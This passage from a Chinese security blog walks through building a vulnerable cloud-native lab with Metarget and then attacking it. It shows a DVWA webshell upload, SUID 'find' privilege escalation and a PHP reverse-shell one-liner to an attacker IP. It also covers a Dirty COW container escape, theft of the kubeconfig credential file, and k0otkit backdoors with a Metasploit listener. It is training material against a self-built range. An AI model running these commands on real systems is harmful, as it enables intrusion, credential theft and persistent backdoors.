http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="34"></td><td><pre>deb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="35"></td><td><pre>deb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment"># 清华源</span></pre></td></tr><tr><td data-num="38"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="39"></td><td><pre>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="40"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="41"></td><td><pre>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="42"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="43"></td><td><pre>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="44"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="45"></td><td><pre>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="46"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="47"></td><td><pre>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308145227545.png" alt="image-20220308145227545" /></p>
<p>刷新列表</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> update</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> build-essential</pre></td></tr></table></figure><h3 id="安装docker"><a class="anchor" href="#安装docker">#</a> 安装 docker</h3>
<p>也可不执行此项操作，metarget 项目集成环境会在执行命令时自动安装 docker！</p>
<p>输入 docker 检测是否安装 docker</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308135713911.png" alt="image-20220308135713911" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> snap <span class="token function">install</span> <span class="token function">docker</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#据说 apt install docker.io 安装的版本会比较旧，果断选择 sudo snap install docker 安装</span></pre></td></tr></table></figure><p>输入 docker 显示</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308135934079.png" alt="image-20220308135934079" /></p>
<h3 id="安装项目"><a class="anchor" href="#安装项目">#</a> 安装项目</h3>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#安装 git</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#安装 curl</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">curl</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#clone 项目</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">git</span> clone https://github.com/brant-ruan/metarget.git</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token builtin class-name">cd</span> metarget/</pre></td></tr><tr><td data-num="8"></td><td><pre>pip3 <span class="token function">install</span> -r requirements.txt</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308134513025.png" alt="image-20220308134513025" /></p>
<p>如有如下报错</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>fatal: unable to access <span class="token string">'https://github.com/brant-ruan/metarget.git/'</span><span class="token builtin class-name">:</span> Failed to connect to github.com port <span class="token number">443</span>: Connection refused</pre></td></tr></table></figure><p>只需要在命令行中执行一下即可</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">git</span> config --global --unset http.proxy </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">git</span> config --global --unset https.proxy</pre></td></tr></table></figure><p>然后执行以下命令，为系统安装带有 CVE-2019-5736 容器逃逸漏洞的 Docker：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> ./metarget cnv <span class="token function">install</span> cve-2019-5736</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308152756996.png" alt="image-20220308152756996" /></p>
<p>接着执行以下命令，为系统安装带有 CVE-2018-1002105 权限提升漏洞的 Kubernetes：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> ./metarget cnv <span class="token function">install</span> cve-2018-1002105 --domestic</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308153604914.png" alt="image-20220308153604914" /></p>
<p>集群部署成功后，最后执行以下命令，在当前集群上部署一个容器化 DVWA：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> ./metarget appv <span class="token function">install</span> dvwa --external</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308153649104.png" alt="image-20220308153649104" /></p>
<p>整个交互过程如下：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>root@ubuntu:~/metarget<span class="token comment"># sudo ./metarget cnv install cve-2019-5736</span></pre></td></tr><tr><td data-num="2"></td><td><pre>cve-2019-5736 is going to be installed</pre></td></tr><tr><td data-num="3"></td><td><pre>uninstalling current <span class="token function">docker</span> gadgets <span class="token keyword">if</span> applicable</pre></td></tr><tr><td data-num="4"></td><td><pre>installing prerequisites</pre></td></tr><tr><td data-num="5"></td><td><pre>adding <span class="token function">apt</span> repository deb <span class="token punctuation">[</span>arch<span class="token operator">=</span>amd64<span class="token punctuation">]</span> https://download.docker.com/linux/ubuntu bionic stable</pre></td></tr><tr><td data-num="6"></td><td><pre>adding <span class="token function">apt</span> repository deb http://archive.ubuntu.com/ubuntu xenial-updates universe</pre></td></tr><tr><td data-num="7"></td><td><pre>adding <span class="token function">apt</span> repository deb http://archive.ubuntu.com/ubuntu bionic-updates universe</pre></td></tr><tr><td data-num="8"></td><td><pre>installing docker-ce with <span class="token number">18.03</span>.1~ce~3-0~ubuntu version</pre></td></tr><tr><td data-num="9"></td><td><pre>cve-2019-5736 successfully installed</pre></td></tr><tr><td data-num="10"></td><td><pre>root@ubuntu:~/metarget<span class="token comment"># sudo ./metarget cnv install cve-2018-1002105 --domestic</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token function">docker</span> already installed</pre></td></tr><tr><td data-num="12"></td><td><pre>cve-2018-1002105 is going to be installed</pre></td></tr><tr><td data-num="13"></td><td><pre>uninstalling current kubernetes <span class="token keyword">if</span> applicable</pre></td></tr><tr><td data-num="14"></td><td><pre>pre-configuring</pre></td></tr><tr><td data-num="15"></td><td><pre>pre-installing</pre></td></tr><tr><td data-num="16"></td><td><pre>adding <span class="token function">apt</span> repository deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main</pre></td></tr><tr><td data-num="17"></td><td><pre>installing kubernetes-cni with <span class="token number">0.6</span>.0-00 version</pre></td></tr><tr><td data-num="18"></td><td><pre>installing kubectl with <span class="token number">1.11</span>.1-00 version</pre></td></tr><tr><td data-num="19"></td><td><pre>installing kubelet with <span class="token number">1.11</span>.1-00 version</pre></td></tr><tr><td data-num="20"></td><td><pre>installing kubeadm with <span class="token number">1.11</span>.1-00 version</pre></td></tr><tr><td data-num="21"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy-amd64:v1.11.1</pre></td></tr><tr><td data-num="22"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager-amd64:v1.11.1</pre></td></tr><tr><td data-num="23"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver-amd64:v1.11.1</pre></td></tr><tr><td data-num="24"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler-amd64:v1.11.1</pre></td></tr><tr><td data-num="25"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1</pre></td></tr><tr><td data-num="26"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/etcd-amd64:3.2.18</pre></td></tr><tr><td data-num="27"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/coredns:1.1.3</pre></td></tr><tr><td data-num="28"></td><td><pre>running kubeadm</pre></td></tr><tr><td data-num="29"></td><td><pre>installing cni plugin</pre></td></tr><tr><td data-num="30"></td><td><pre>installing flannel</pre></td></tr><tr><td data-num="31"></td><td><pre>pulling quay.mirrors.ustc.edu.cn/coreos/flannel:v0.10.0-amd64</pre></td></tr><tr><td data-num="32"></td><td><pre>generating kubernetes worker script</pre></td></tr><tr><td data-num="33"></td><td><pre>kubernetes worker script generated at tools/install_k8s_worker.sh</pre></td></tr><tr><td data-num="34"></td><td><pre>cve-2018-1002105 successfully installed</pre></td></tr><tr><td data-num="35"></td><td><pre>root@ubuntu:~/metarget<span class="token comment"># sudo ./metarget appv install dvwa --external</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token function">docker</span> already installed</pre></td></tr><tr><td data-num="37"></td><td><pre>kubernetes already installed</pre></td></tr><tr><td data-num="38"></td><td><pre>dvwa is going to be installed</pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token function">node</span> port <span class="token number">30000</span> is allocated <span class="token keyword">for</span> <span class="token for-or-select variable">service</span> <span class="token keyword">in</span> vulns_app/dvwa/dvwa/dvwa-service.yaml</pre></td></tr><tr><td data-num="40"></td><td><pre>applying yamls/k8s_metarget_namespace.yaml</pre></td></tr><tr><td data-num="41"></td><td><pre>applying vulns_app/dvwa/dvwa/dvwa-deployment.yaml</pre></td></tr><tr><td data-num="42"></td><td><pre>applying data/dvwa-service.yaml</pre></td></tr><tr><td data-num="43"></td><td><pre>dvwa successfully installed</pre></td></tr></table></figure><p>根据命令行输出的内容，我们可以直接在浏览器中访问到容器内的 DVWA 服务：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>http://127.0.0.1:30000/login.php</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308154111690.png" alt="image-20220308154111690" /></p>
<p>可以看到，我们只需要三行命令，就完成了一个多层次靶机环境的构建。<br />
环境的清理也十分简单，只需依次执行以下命令即可：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./metarget appv remove dvwa</pre></td></tr><tr><td data-num="2"></td><td><pre>./metarget cnv remove cve-2018-1002105</pre></td></tr><tr><td data-num="3"></td><td><pre>./metarget cnv remove cve-2019-5736</pre></td></tr></table></figure><h3 id="项目测试"><a class="anchor" href="#项目测试">#</a> 项目测试</h3>
<p>使用 <code>admin/password</code>  登陆 dvwa</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308154234054.png" alt="image-20220308154234054" /></p>
<p>按提示创建数据库，再重新登录即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308155157236.png" alt="image-20220308155157236" /></p>
<p>直接使用文件上传来获取 webshell<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308155503052.png" alt="image-20220308155503052" /></p>
<p>上传冰蝎的 shell 连接获得 webshell，可以看到当前权限为 www-data 权限。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xpdGNoMS12L2JlaGluZGVyLWNsb25lL3JlbGVhc2VzL3RhZy8wLjAuMQ==">冰蝎项目地址</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308172603521.png" alt="image-20220308172603521" /></p>
<p>接下来进行提权操作。</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>脏牛提权：Linux内核<span class="token operator">></span> <span class="token operator">=</span> <span class="token number">2.6</span>.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。</pre></td></tr><tr><td data-num="2"></td><td><pre>查看发行版本</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">cat</span> /etc/issue</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">cat</span> /etc/*-release</pre></td></tr><tr><td data-num="5"></td><td><pre>查看内核版本信息</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">uname</span> -a</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308172843204.png" alt="image-20220308172843204" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>SUID配置错误提权：</pre></td></tr><tr><td data-num="2"></td><td><pre>以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">find</span> / -user root -perm -4000-print<span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">find</span> / -user root -perm -4000-exec <span class="token function">ls</span> -ldb <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>这里我为了方便测试给环境中的 find 加了 suid 权限</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">whoami</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">which</span> <span class="token function">find</span>  <span class="token comment">#或者用 whereis find 命令查找也行</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">chmod</span> u+s /usr/bin/find</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">ls</span> -la /usr/bin/find <span class="token comment">#查看 SUID 权限是否成功赋予</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308184957887.png" alt="image-20220308184957887" /></p>
<p>通过命令查找设置了 suid 权限的可执行程序：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308185257546.png" alt="image-20220308185257546" /></p>
<h4 id="find命令提权"><a class="anchor" href="#find命令提权">#</a> find 命令提权</h4>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308190451125.png" alt="image-20220308190451125" /></p>
<p>find 的 - exec 参数可以用来执行任意命令。因此我们可以使用添加了 suid 标识的 find 可执行程序以 root 身份执行命令来提权。我们尝试使用 find 来执行 whomai 命令。</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">find</span> xxx -exec <span class="token function">whoami</span> <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308190509426.png" alt="image-20220308190509426" /></p>
<p>接着我们可以使用 find 来执行反弹 shell 命令，</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">find</span> webshell.php -exec php -r <span class="token string">'$sock=fsockopen("192.168.146.153",8000);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span> <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>这里使用冰蝎执行反弹 shell 命令总是显示操作失败。<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308191647853.png" alt="image-20220308191647853" /></p>
<h4 id="weevely后门连接"><a class="anchor" href="#weevely后门连接">#</a> weevely 后门连接</h4>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─<span class="token comment"># weevely                                                   </span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> weevely <span class="token number">4.0</span>.1</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Error: the following arguments are required: url, password</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Run terminal or <span class="token builtin class-name">command</span> on the target  //连接后门</pre></td></tr><tr><td data-num="8"></td><td><pre>    weevely <span class="token operator">&lt;</span>URL<span class="token operator">></span> <span class="token operator">&lt;</span>password<span class="token operator">></span> <span class="token punctuation">[</span>cmd<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Recover an existing session</pre></td></tr><tr><td data-num="11"></td><td><pre>    weevely session <span class="token operator">&lt;</span>path<span class="token operator">></span> <span class="token punctuation">[</span>cmd<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Generate new agent   //生成后门</pre></td></tr><tr><td data-num="14"></td><td><pre>    weevely generate <span class="token operator">&lt;</span>password<span class="token operator">></span> <span class="token operator">&lt;</span>path<span class="token operator">></span></pre></td></tr></table></figure><p>使用 weevely 生成一个后门木马：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─<span class="token comment"># weevely generate test hello.php                                               2 ⨯</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Generated <span class="token string">'hello.php'</span> with password <span class="token string">'test'</span> of <span class="token number">771</span> byte size.</pre></td></tr></table></figure><p>查找生成文件</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─<span class="token comment"># find / -name hello.php</span></pre></td></tr><tr><td data-num="3"></td><td><pre>/root/桌面/hello.php</pre></td></tr></table></figure><p>上传 hello.php</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308192247992.png" alt="image-20220308192247992" /></p>
<p>weevely 连接测试</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─<span class="token comment"># weevely http://192.168.146.153:30000/hackable/uploads/hello.php test</span></pre></td></tr></table></figure><p>执行反弹 shell 成功了<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308192459489.png" alt="image-20220308192459489" /></p>
<p>提权成功，获得了 root 权限的 shell，但是这个 shell 并不是一个完全的 root shell，它是一个 euid 为 root，uid 依旧是 www-data 的 shell，也就是说我们只是获得了一个暂时的 root shell。</p>
<h3 id="容器探测"><a class="anchor" href="#容器探测">#</a> 容器探测：</h3>
<p>测试过程中发现当前环境一些命令是没有，猜测当前环境可能是一个容器，通过查找.dockerenv 文件和查看 cgroup 来判断当前我们是否在容器中。通过命令回显（kubepods）猜测我们当前处在在一个 k8s 的 pod 中。</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">ls</span> -la / <span class="token operator">|</span> <span class="token function">grep</span> dockerenv</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">cat</span> /proc/1/cgroup</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308193102735.png" alt="image-20220308193102735" /></p>
<p>k8s、pod、容器之间的大概关系可以简单理解为：集群中包含多个 pod，pod 中包含多个容器。</p>
<h3 id="容器逃逸"><a class="anchor" href="#容器逃逸">#</a> 容器逃逸：</h3>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#CVE-2016-5195 脏牛漏洞：</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> -y <span class="token function">make</span> gcc nasm</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">git</span> clone https://github.com/scumjr/dirtycow-vdso</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">cd</span> dirtycow-vdso</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">make</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308194849291.png" alt="image-20220308194849291" /></p>
<p>运行</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./0xdeadbeef attacker-ip:port</pre></td></tr></table></figure><p>报错 emmmm 屮，挖坑，回来再填</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308202711039.png" alt="image-20220308202711039" /></p>
<p>将获得宿主机的反弹 shell，使用宿主机反弹回来的 shell 窃取 Kubernetes 管理员的访问凭据：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">ls</span> -al /root <span class="token operator">|</span> <span class="token function">grep</span> kube</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">cat</span> /root/.kube/config</pre></td></tr></table></figure><p>将以上凭据保存在本地 kubeconfig 文件，然后尝试用凭据 连接并查看 Kubernetes 集群:</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>kubectl --kubeconfig ./kubeconfig get nodes</pre></td></tr><tr><td data-num="2"></td><td><pre>kubectl --kubeconfig ./kubeconfig get pods</pre></td></tr></table></figure><h3 id="控制集群权限维持"><a class="anchor" href="#控制集群权限维持">#</a> 控制集群 + 权限维持：</h3>
<p>k0otkit 允许我们在取得集群 Master 节点控制权限后，快速在集群所有节点上创建隐蔽、持久的反弹 shell 后⻔。克隆 Github 仓库到攻击者自己的 Linux 服务器 (k0otkit 依赖于 Metasploit，服务器上需要存在 msfvenom 和 msfconsole 两个工具)，修改攻击者 IP，然后执行 pre_exp.sh:</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">git</span> clone https://github.com/brant-ruan/k0otkit</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">cd</span> k0otkit</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">chmod</span> u+x ./*.sh</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># 修改 pre_exp.sh 中的 ATTACKER_IP 变量为实际攻击者 IP </span></pre></td></tr><tr><td data-num="5"></td><td><pre>./pre_exp.sh</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308200306557.png" alt="image-20220308200306557" /><br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308200247927.png" alt="image-20220308200247927" /></p>
<p>脚本执行完成后，目录下新产生了一个 k0otkit.sh 文件，后面会用到。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308200404992.png" alt="image-20220308200404992" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308200340465.png" alt="image-20220308200340465" /></p>
<p>接下来，执行 <code>handle_multi_reverse_shell.sh</code>  脚本，该脚本将打开 <code>msfconsole</code>  并运行一个反弹 shell 监听模块:</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/k0otkit<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─<span class="token comment"># ./handle_multi_reverse_shell.sh</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcp</pre></td></tr><tr><td data-num="4"></td><td><pre>payload <span class="token operator">=</span><span class="token operator">></span> linux/x86/meterpreter/reverse_tcp</pre></td></tr><tr><td data-num="5"></td><td><pre>LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0.0</span>.0.0</pre></td></tr><tr><td data-num="6"></td><td><pre>LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">4444</span></pre></td></tr><tr><td data-num="7"></td><td><pre>ExitOnSession <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit running as background job <span class="token number">0</span>.</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit completed, but no session was created.</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">0.0</span>.0.0:4444 </pre></td></tr><tr><td data-num="12"></td><td><pre>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308200434755.png" alt="image-20220308200434755" /></p>
<p>然后复制 k0otkit.sh 文件内容到容器逃逸后的 root shell 中运行，攻击者的机器会收到传回来的 session：</p>
<p>k0otkit 在每个节点上创建了一个特权 Pod，该 Pod 与节点共享 Net 和 PID 命名空间，并且在容器内的 /var/kube-proxy-cache 路径挂载了宿主机的根目录，上面 msfconsole 收到的正是由这些特权 Pod 反弹回来的 shell。借助这些经过去隔离的特权 Pod，我们可以很方便地控制集群。</p>
<h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h2>
<p><span class="exturl" data-url="aHR0cDovL2Jsb2cubnNmb2N1cy5uZXQvbWV0YXJnZXQv">METARGET：云原生攻防靶场开源啦！</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbWljcjA2Ny9wLzE1NDg5MTA3Lmh0bWw=">云原生攻防靶场 - Metarget</span></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>各类报错问题总结</title>
    <url>/article/acfa1bff.html</url>
    <content><![CDATA[<h1 id="kali-安装gmpy2报错问题总结"><a class="anchor" href="#kali-安装gmpy2报错问题总结">#</a> kali 安装 gmpy2 报错问题总结</h1>
<h2 id="1缺失依赖包问题"><a class="anchor" href="#1缺失依赖包问题">#</a> 1. 缺失依赖包问题</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205131630193.png" alt="image-20211205131630193" /></p>
